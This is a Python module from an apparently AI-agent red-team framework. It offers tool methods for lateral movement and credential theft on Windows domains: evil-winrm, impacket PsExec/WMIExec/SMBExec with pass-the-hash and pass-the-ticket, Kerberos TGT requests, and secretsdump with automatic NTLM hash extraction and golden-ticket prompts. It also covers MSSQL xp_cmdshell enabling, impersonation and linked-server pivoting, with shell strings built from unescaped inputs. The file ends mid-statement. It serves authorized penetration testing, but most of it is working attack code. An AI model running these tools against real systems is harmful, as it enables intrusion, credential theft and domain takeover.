"""Red Team lateral movement and remote execution tools.

This module provides toolsets for:
- WinRM (evil-winrm)
- PsExec, WMIExec, SMBExec
- Kerberos pass-the-ticket attacks
- MSSQL attacks
"""

import logging
import re
from typing import ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import Hash, SharedRedTeamState
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    check_port,
    resolve_password,
    run_tool,
)

logger = logging.getLogger(__name__)


class LateralMovementTools(Toolset):
    """Tools for lateral movement and remote access.

    These tools enable interactive sessions and command execution
    on compromised systems.
    """

    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _check_port(self, target: str, port: int, timeout_seconds: int = 5) -> bool:
        return check_port(target, port, timeout_seconds)

    def _check_smb_exec(
        self,
        target: str,
        username: str,
        password: str | None,
        hash: str | None,
        domain: str | None,
    ) -> bool | None:
        if not (password or hash):
            return None
        cmd = ["netexec", "smb", target, "-u", username]
        if password:
            cmd.extend(["-p", password])
        elif hash:
            cmd.extend(["-H", hash])
        if domain:
            cmd.extend(["-d", domain])
        cmd.extend(["-x", "whoami"])
        try:
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
        except Exception:
            return None
        output = (stdout or "") + ("\n" + stderr if stderr else "")
        lowered = output.lower()
        if "pwn3d" in lowered or "command output" in lowered or "whoami" in lowered:
            return True
        if "access denied" in lowered or "nt_status_access_denied" in lowered:
            return False
        if "logon failure" in lowered or "status_logon_failure" in lowered:
            return False
        return None

    @dn.tool_method
    def evil_winrm(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str | None = None,
    ) -> str:
        """
        Execute command or establish WinRM session (evil-winrm).

        WinRM (Windows Remote Management) enables remote PowerShell access.
        Use for lateral movement after obtaining credentials.

        Args:
            target: Target machine IP
            username: Username for authentication
            password: Password (optional if using hash)
            hash: NTLM hash for pass-the-hash (optional if using password)
            domain: Domain for authentication (optional)
            command: Command to execute (if None, would start interactive session)

        Returns:
            Command output or session status

        Example:
            >>> evil_winrm("192.168.56.22", "admin", password="pass")  # pragma: allowlist secret
            >>> evil_winrm("192.168.56.22", "admin", hash="aad3b435...")
        """
        if not (password or hash):
            return "[!] Error: Either password or hash must be provided"

        if not (self._check_port(target, 5985) or self._check_port(target, 5986)):
            logger.warning("WinRM not reachable on %s (ports 5985/5986 closed)", target)
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = ["evil-winrm", "-i", target, "-u", username]

        if resolved_password:
            cmd.extend(["-p", resolved_password])
        elif hash:
            cmd.extend(["-H", hash])
        if command:
            cmd.extend(["-c", command])
        else:
            cmd.extend(["-c", "whoami && hostname && ipconfig"])

        try:
            logger.info(f"[*] Connecting to {target} via WinRM")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if (
                returncode == 0
                or "nt authority\\system" in result.lower()
                or username.lower() in result.lower()
            ):
                logger.info(f"[+] WinRM session to {target} successful!")

            return result

        except Exception as e:
            return f"evil-winrm failed: {e}"

    @dn.tool_method
    def psexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "cmd.exe",
    ) -> str:
        """
        Execute command via PsExec (impacket-psexec).

        PsExec enables remote command execution via SMB. Requires admin access.
        More reliable than WinRM in some environments.

        Args:
            target: Target machine IP
            username: Username with admin access
            password: Password (optional if using hash)
            hash: NTLM hash for pass-the-hash (optional)
            domain: Domain for authentication
            command: Command to execute (default: cmd.exe)

        Returns:
            Command output

        Example:
            >>> psexec("192.168.56.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        precheck = self._check_smb_exec(target, username, resolved_password, hash, domain)
        if precheck is False:
            return "[!] SMB exec precheck failed; admin access likely missing."

        if hash and not resolved_password:
            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        else:
            target_string = f"{domain}/{username}" if domain else username
            target_string += f":{resolved_password}@{target}" if resolved_password else f"@{target}"

        cmd = ["impacket-psexec", target_string]

        if hash:
            cmd.extend(["-hashes", f":{hash}"])

        cmd.extend(["-c", command])

        try:
            logger.info(f"[*] Executing via PsExec on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"PsExec failed: {e}"

    @dn.tool_method
    def wmiexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "whoami",
    ) -> str:
        """
        Execute command via WMI (impacket-wmiexec).

        WMI execution is often more stealthy than PsExec.
        """
        precheck = self._check_smb_exec(target, username, password, hash, domain)
        if precheck is False:
            return "[!] SMB exec precheck failed; admin access likely missing."

        if hash and not password:
            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        else:
            target_string = f"{domain}/{username}" if domain else username
            target_string += f":{password}@{target}" if password else f"@{target}"

        cmd = ["impacket-wmiexec", target_string]
        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        cmd.extend([command])

        try:
            logger.info(f"[*] Executing via WMI on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")
        except Exception as e:
            return f"WMIExec failed: {e}"

    @dn.tool_method
    def smbexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "whoami",
    ) -> str:
        """
        Execute command via SMB service (impacket-smbexec).

        SMBExec creates a service per command and retrieves output over SMB.
        """
        precheck = self._check_smb_exec(target, username, password, hash, domain)
        if precheck is False:
            return "[!] SMB exec precheck failed; admin access likely missing."

        if hash and not password:
            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        else:
            target_string = f"{domain}/{username}" if domain else username
            target_string += f":{password}@{target}" if password else f"@{target}"

        cmd = ["impacket-smbexec", target_string]
        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        cmd.extend([command])

        try:
            logger.info(f"[*] Executing via SMBExec on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")
        except Exception as e:
            return f"SMBExec failed: {e}"

    # Kerberos pass-the-ticket methods

    @dn.tool_method
    def get_tgt(
        self,
        username: str,
        domain: str,
        password: str | None = None,
        hash: str | None = None,
        dc_ip: str | None = None,
    ) -> str:
        """
        Request Kerberos TGT for pass-the-ticket attacks.

        Generates a .ccache file that can be used for Kerberos authentication
        with other tools using KRB5CCNAME environment variable.

        Args:
            username: Username to request TGT for
            domain: Domain name (e.g., 'domain.local')
            password: Password for authentication (optional if using hash)
            hash: NTLM hash for authentication (optional if using password)
            dc_ip: Domain controller IP address (optional)

        Returns:
            Path to .ccache file or error message

        Example:
            >>> get_tgt("admin", "domain.local", password="pass")  # pragma: allowlist secret
            >>> get_tgt("admin", "domain.local", hash="aad3b435...")
        """
        if not (password or hash):
            return "[!] Error: Either password or hash must be provided"

        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Build target string
        if resolved_password:
            target_string = f"{domain}/{username}:{resolved_password}"
        else:
            target_string = f"{domain}/{username}"

        cmd = ["impacket-getTGT", target_string]

        if hash and not resolved_password:
            cmd.extend(["-hashes", f":{hash}"])

        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        try:
            logger.info(f"[*] Requesting TGT for {domain}\\{username}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            output = stdout + "\n" + (stderr or "")

            # Extract ccache file path from output
            ccache_match = re.search(r"Saving ticket in ([^\s]+\.ccache)", output)
            if ccache_match:
                ccache_path = ccache_match.group(1)
                logger.info(f"[+] TGT saved to {ccache_path}")
                return (
                    f"✅ TGT obtained successfully!\n"
                    f"→ Ticket saved to: {ccache_path}\n"
                    f"→ Use with: export KRB5CCNAME={ccache_path}\n"
                    f"→ Or use psexec_kerberos/wmiexec_kerberos/secretsdump_kerberos\n\n" + output
                )

            if returncode == 0:
                return f"[+] getTGT completed\n{output}"

            return output

        except Exception as e:
            return f"getTGT failed: {e}"

    @dn.tool_method
    def psexec_kerberos(
        self,
        target: str,
        username: str,
        domain: str,
        ticket_path: str | None = None,
        command: str = "cmd.exe /c whoami && hostname",
        dc_ip: str | None = None,
        target_ip: str | None = None,
    ) -> str:
        """
        Execute command via PsExec using Kerberos ticket (pass-the-ticket).

        Uses a .ccache ticket file for authentication instead of password/hash.
        IMPORTANT: Kerberos requires FQDN hostname, not IP address.

        Args:
            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
            username: Username the ticket was issued for
            domain: Domain name (e.g., 'domain.local')
            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
            command: Command to execute (default: whoami && hostname)
            dc_ip: Domain controller IP for Kerberos (optional)
            target_ip: Target IP address to connect to (overrides DNS resolution)

        Returns:
            Command output or error message

        Example:
            >>> psexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
            >>> psexec_kerberos("dc01.domain.local", "admin", "domain.local", ticket_path="admin.ccache")
        """
        # Validate target is FQDN (Kerberos requires hostname, not IP)
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
            return (
                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
            )

        actual_ticket = ticket_path or f"{username}.ccache"
        target_string = f"{domain}/{username}@{target}"

        cmd = ["impacket-psexec", "-k", "-no-pass", target_string]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        if target_ip:
            cmd.extend(["-target-ip", target_ip])
        cmd.extend(["-c", command])

        # Prepend KRB5CCNAME environment variable
        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd

        try:
            logger.info(f"[*] Executing via Kerberos PsExec on {target}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            output = stdout + "\n" + (stderr or "")

            if returncode == 0 or username.lower() in output.lower():
                logger.info(f"[+] Kerberos PsExec to {target} successful!")

            return output

        except Exception as e:
            return f"Kerberos PsExec failed: {e}"

    @dn.tool_method
    def wmiexec_kerberos(
        self,
        target: str,
        username: str,
        domain: str,
        ticket_path: str | None = None,
        command: str = "whoami",
        dc_ip: str | None = None,
        target_ip: str | None = None,
    ) -> str:
        """
        Execute command via WMI using Kerberos ticket (pass-the-ticket).

        Uses a .ccache ticket file for authentication. More stealthy than PsExec.
        IMPORTANT: Kerberos requires FQDN hostname, not IP address.

        Args:
            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
            username: Username the ticket was issued for
            domain: Domain name (e.g., 'domain.local')
            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
            command: Command to execute (default: whoami)
            dc_ip: Domain controller IP for Kerberos (optional)
            target_ip: Target IP address to connect to (overrides DNS resolution)

        Returns:
            Command output or error message

        Example:
            >>> wmiexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
        """
        # Validate target is FQDN (Kerberos requires hostname, not IP)
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
            return (
                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
            )

        actual_ticket = ticket_path or f"{username}.ccache"
        target_string = f"{domain}/{username}@{target}"

        cmd = ["impacket-wmiexec", "-k", "-no-pass", target_string]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        if target_ip:
            cmd.extend(["-target-ip", target_ip])
        cmd.append(command)

        # Prepend KRB5CCNAME environment variable
        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd

        try:
            logger.info(f"[*] Executing via Kerberos WMIExec on {target}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            output = stdout + "\n" + (stderr or "")

            if returncode == 0:
                logger.info(f"[+] Kerberos WMIExec to {target} successful!")

            return output

        except Exception as e:
            return f"Kerberos WMIExec failed: {e}"

    @dn.tool_method
    def smbexec_kerberos(
        self,
        target: str,
        username: str,
        domain: str,
        ticket_path: str | None = None,
        command: str = "whoami",
        dc_ip: str | None = None,
    ) -> str:
        """
        Execute command via SMB using Kerberos ticket (pass-the-ticket).

        Uses a .ccache ticket file for authentication.
        IMPORTANT: Kerberos requires FQDN hostname, not IP address.

        Args:
            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
            username: Username the ticket was issued for
            domain: Domain name (e.g., 'domain.local')
            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
            command: Command to execute (default: whoami)
            dc_ip: Domain controller IP for Kerberos (optional)

        Returns:
            Command output or error message

        Example:
            >>> smbexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
        """
        # Validate target is FQDN (Kerberos requires hostname, not IP)
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
            return (
                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
            )

        actual_ticket = ticket_path or f"{username}.ccache"
        target_string = f"{domain}/{username}@{target}"

        cmd = ["impacket-smbexec", "-k", "-no-pass", target_string]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        cmd.append(command)

        # Prepend KRB5CCNAME environment variable
        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd

        try:
            logger.info(f"[*] Executing via Kerberos SMBExec on {target}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            output = stdout + "\n" + (stderr or "")

            if returncode == 0:
                logger.info(f"[+] Kerberos SMBExec to {target} successful!")

            return output

        except Exception as e:
            return f"Kerberos SMBExec failed: {e}"

    @dn.tool_method
    def secretsdump_kerberos(
        self,
        target: str,
        username: str,
        domain: str,
        ticket_path: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        timeout_minutes: int = 5,
    ) -> str:
        """
        Dump secrets using Kerberos ticket authentication (pass-the-ticket).

        Uses a .ccache ticket file (e.g., from S4U attack) to authenticate
        and dump SAM database, cached credentials, and LSA secrets.
        IMPORTANT: Kerberos requires FQDN hostname, not IP address.

        Args:
            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
            username: Username the ticket was issued for (e.g., 'Administrator')
            domain: Domain name (e.g., 'domain.local')
            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
            dc_ip: Domain controller IP for Kerberos (optional)
            target_ip: Target IP address to connect to (overrides DNS resolution)
            timeout_minutes: Maximum time for dumping (default: 5)

        Returns:
            Extracted credentials including NTLM hashes, Kerberos keys, and secrets

        Example:
            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local")
            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local", ticket_path="Administrator.ccache")
        """
        # Validate target is FQDN (Kerberos requires hostname, not IP)
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
            return (
                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
            )

        actual_ticket = ticket_path or f"{username}.ccache"
        target_string = f"{domain}/{username}@{target}"

        cmd = ["impacket-secretsdump", "-k", "-no-pass", target_string]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        if target_ip:
            cmd.extend(["-target-ip", target_ip])

        # Prepend KRB5CCNAME environment variable
        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd

        try:
            logger.info(f"[*] Running Kerberos secretsdump on {target}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=timeout_minutes * 60)

            output = stdout + "\n" + (stderr or "")

            # Check for high-value hashes
            has_krbtgt = "krbtgt:" in output.lower()
            has_administrator = "administrator:" in output.lower() and ":::" in output

            if has_krbtgt:
                output = (
                    "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
                    "→ Use generate_golden_ticket to forge tickets\n"
                    "→ This grants PERSISTENT domain admin access\n\n" + output
                )
            elif has_administrator:
                output = (
                    "🚨 ADMINISTRATOR HASH EXTRACTED - DOMAIN ADMIN ACHIEVED!\n"
                    "→ Domain admin access confirmed\n"
                    "→ Run secretsdump on all remaining DCs\n\n" + output
                )

            if returncode == 0:
                logger.info(f"[+] Kerberos secretsdump on {target} successful!")

            # Auto-extract NTLM hashes into state for real-time propagation
            if self.state:
                self._extract_ntlm_hashes_to_state(output, domain)

            return output

        except Exception as e:
            return f"Kerberos secretsdump failed: {e}"

    def _extract_ntlm_hashes_to_state(  # noqa: PLR0912
        self, output: str, domain: str
    ) -> None:
        """Extract NTLM hashes from secretsdump output and add to state immediately.

        This triggers real-time Redis checkpoint so the orchestrator sees hashes
        without waiting for task completion.
        """
        if not output:
            return

        extracted = 0
        guest_null_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # pragma: allowlist secret
        for line in output.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith(("[", "#")):
                continue

            # Match domain-prefixed: DOMAIN\user:rid:lmhash:nthash:::
            m = re.match(
                r"([^\\:\s]+)\\([^:\\]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
                stripped,
            )
            if m:
                h_domain, h_user = m.group(1), m.group(2)
                lm_hash, nt_hash = m.group(4), m.group(5)
            else:
                # Match non-prefixed: user:rid:lmhash:nthash:::
                m = re.match(
                    r"([^:\\$\s]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
                    stripped,
                )
                if m:
                    h_user = m.group(1)
                    h_domain = domain
                    lm_hash, nt_hash = m.group(3), m.group(4)
                else:
                    continue

            # Skip Guest with null NT hash, and machine accounts
            if nt_hash == guest_null_hash and h_user.lower() == "guest":
                continue
            if h_user.endswith("$"):
                continue

            hash_obj = Hash(
                username=h_user,
                hash_value=f"{lm_hash}:{nt_hash}",
                hash_type="NTLM",
                domain=h_domain,
                source="secretsdump",
            )

            if isinstance(self.state, SharedRedTeamState):
                if self.state.add_hash(hash_obj, "secretsdump"):
                    extracted += 1
            elif self.state is not None:
                self.state.hashes.append(hash_obj)
                extracted += 1

        if extracted:
            logger.warning(
                f"[+] Auto-extracted {extracted} NTLM hashes from secretsdump into state"
            )
            # Record NTDS dump as a weakness
            if isinstance(self.state, SharedRedTeamState):
                self.state.add_weakness(
                    f"### Full NTDS.DIT dump — {extracted} NTLM hashes extracted\n"
                    f"**Vulnerability:** Secretsdump successfully dumped {extracted} "
                    f"NTLM hashes from a domain controller, exposing all domain credentials.\n"
                    f"- **Affected Resource:** {domain} domain controller\n"
                    f"- **Discovery Method:** secretsdump (Kerberos auth via S4U/pass-the-ticket)\n"
                    f"- **Impact:** All domain user password hashes compromised. "
                    f"Enables pass-the-hash, golden ticket, and complete domain takeover."
                )


class MSSQLTools(Toolset):
    """Tools for MSSQL exploitation and privilege escalation.

    These tools target MSSQL servers for command execution, privilege escalation,
    and lateral movement through linked servers.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def mssql_command(
        self,
        target: str,
        username: str,
        password: str,
        command: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Execute commands on MSSQL server via xp_cmdshell.

        Use when you have sysadmin privileges on an MSSQL server.
        xp_cmdshell must be enabled (use mssql_enable_xp_cmdshell first if needed).

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            command: System command to execute
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication (default: True)

        Returns:
            Command output from the target system

        Example:
            >>> mssql_command("192.168.56.22", "sa", "password", "whoami", windows_auth=False)  # pragma: allowlist secret
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional command execution for MSSQL pentest
        cmd_string = f"echo \"xp_cmdshell '{command}'\" | mssqlclient.py {target_string}"
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Executing command on MSSQL: {command}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"MSSQL command execution failed: {e}"

    @dn.tool_method
    def mssql_enable_xp_cmdshell(
        self,
        target: str,
        username: str,
        password: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Enable xp_cmdshell on an MSSQL server for command execution.

        Requires sysadmin privileges on the MSSQL server.
        After enabling, use mssql_command to execute system commands.

        Args:
            target: MSSQL server IP
            username: Username with sysadmin privileges
            password: Password for authentication
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication (default: True)

        Returns:
            xp_cmdshell enablement result

        Example:
            >>> mssql_enable_xp_cmdshell("192.168.56.22", "user", "pass", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest
        enable_commands = """
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
"""
        cmd_string = f'echo "{enable_commands}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Enabling xp_cmdshell on {target}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "configuration option" in result.lower() or "changed" in result.lower():
                logger.info("[+] xp_cmdshell enabled!")
                result = (
                    "\u2705 xp_cmdshell ENABLED!\n"
                    "\u2192 Use mssql_command to execute system commands\n\n" + result
                )

            return result

        except Exception as e:
            return f"xp_cmdshell enable failed: {e}"

    @dn.tool_method
    def mssql_enum_impersonation(
        self,
        target: str,
        username: str,
        password: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Enumerate MSSQL users that can be impersonated for privilege escalation.

        Discovers accounts with IMPERSONATE permission granted, which can be
        used with mssql_impersonate to escalate privileges. Run this BEFORE
        attempting impersonation to know which users are valid targets.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication

        Returns:
            List of users that can be impersonated

        Example:
            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest recon
        sql_query = """
SELECT DISTINCT b.name AS 'ImpersonatableUser'
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
"""
        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Enumerating impersonation rights on {target}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Check if we found impersonatable users
            if "impersonatableuser" in result.lower() and (
                "sa" in result.lower() or "admin" in result.lower() or "dbo" in result.lower()
            ):
                logger.warning("[!] High-value impersonation targets found!")
                result = (
                    "🚨 IMPERSONATION TARGETS FOUND!\n"
                    "\u2192 Use mssql_impersonate to execute queries as these users\n"
                    "\u2192 Target 'sa' or admin accounts for sysadmin access\n\n" + result
                )
            elif "impersonatableuser" in result.lower():
                logger.info("[+] Impersonation rights enumerated")
                result = (
                    "📋 IMPERSONATION RIGHTS FOUND\n"
                    "\u2192 Use mssql_impersonate with discovered users\n\n" + result
                )

            return result

        except Exception as e:
            return f"Impersonation enumeration failed: {e}"

    @dn.tool_method
    def mssql_impersonate(
        self,
        target: str,
        username: str,
        password: str,
        impersonate_user: str,
        query: str,
        domain: str | None = None,
        windows_auth: bool = True,
        database: str | None = None,
    ) -> str:
        """
        Impersonate another SQL user for privilege escalation.

        MSSQL allows impersonation if EXECUTE AS permissions are granted.
        Use to escalate from low-privileged SQL login to sysadmin.

        Run mssql_enum_impersonation FIRST to discover valid impersonation targets.

        Args:
            target: MSSQL server IP
            username: Current username
            password: Password for authentication
            impersonate_user: User to impersonate (e.g., 'sa', 'dbo') - get from mssql_enum_impersonation
            query: SQL query to execute as impersonated user
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication
            database: Target database for impersonation (optional)

        Returns:
            Query result executed as the impersonated user

        Example:
            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")  # First enumerate
            >>> mssql_impersonate("192.168.56.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        sql_commands = []
        if database:
            sql_commands.append(f"USE [{database}];")
        sql_commands.append(f"EXECUTE AS USER = '{impersonate_user}';")
        sql_commands.append(query)
        sql_commands.append("REVERT;")
        sql_script = " ".join(sql_commands)

        cmd_string = f'echo "{sql_script}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(
                "[*] Executing query as %s on %s (db=%s)",
                impersonate_user,
                target,
                database or "default",
            )
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"mssql_execute_as_user failed: {e}"

    @dn.tool_method
    def mssql_enum_linked_servers(
        self,
        target: str,
        username: str,
        password: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Enumerate MSSQL linked servers for cross-server pivoting.

        Linked servers enable SQL queries across database instances and can be
        chained for privilege escalation across servers, domains, and forests.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication

        Returns:
            List of linked servers with access information

        Example:
            >>> mssql_enum_linked_servers("192.168.56.22", "user", "pass", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest recon
        sql_query = """
SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;
"""
        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Enumerating linked servers on {target}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "linked" in result.lower() or "srv_name" in result.lower():
                logger.info("[+] Linked servers found!")
                result = (
                    "📋 LINKED SERVERS FOUND\n"
                    "\u2192 Use mssql_exec_linked to execute queries on linked servers\n"
                    "\u2192 Chain across servers for cross-domain/forest pivoting\n\n" + result
                )

            return result

        except Exception as e:
            return f"Linked server recon failed: {e}"

    @dn.tool_method
    def mssql_exec_linked(
        self,
        target: str,
        username: str,
        password: str,
        linked_server: str,
        query: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Execute query on a linked MSSQL server (cross-server pivoting).

        Use after finding linked servers with mssql_enum_linked_servers.
        Can enable xp_cmdshell on remote servers through the link chain.

        Args:
            target: Local MSSQL server IP (where you have access)
            username: Username for local authentication
            password: Password for authentication
            linked_server: Name of the linked server to execute on
            query: SQL query to execute (or 'xp_cmdshell ''command''')
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication

        Returns:
            Query result from the linked server

        Example:
            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest recon
        sql_query = f"EXEC ('{query}') AT [{linked_server}];"

        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Executing query on linked server {linked_server}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "system_user" in result.lower() or "nt authority" in result.lower():
                logger.info(f"[+] Successful execution on {linked_server}!")
                result = (
                    f"🚨 LINKED SERVER EXECUTION SUCCESSFUL ON {linked_server}!\n"
                    "\u2192 Try enabling xp_cmdshell: sp_configure 'xp_cmdshell', 1\n"
